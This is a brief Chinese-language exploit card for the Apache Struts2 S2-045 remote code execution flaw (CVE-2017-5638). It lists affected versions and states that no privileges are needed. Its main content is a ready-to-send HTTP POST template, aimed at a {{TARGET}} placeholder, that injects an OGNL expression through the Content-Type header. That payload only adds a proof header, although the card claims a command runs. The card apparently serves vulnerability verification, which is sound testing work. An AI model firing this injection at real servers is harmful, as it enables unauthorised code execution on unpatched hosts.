# S2-045 Struts2 远程代码执行 (CVE-2017-5638)

## 指纹特征
- 服务: Apache Struts2 (2.3.5 - 2.3.31, 2.5 - 2.5.10)
- 协议: HTTP (Content-Type 头部)

## 利用矩阵
| 触发方式 | 关键接口 | 权限要求 |
| :--- | :--- | :--- |
| Content-Type 头部注入 | 任意 | 无 |

## PoC 指令

通过构造包含恶意 OGNL 表达式的 `Content-Type` 头部触发 RCE：

```http
POST / HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: %{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233))}.multipart/form-data
```

- **状态验证**: 命令在后端成功执行。
- **验证回显**: 响应或响应头中包含命令执行结果。
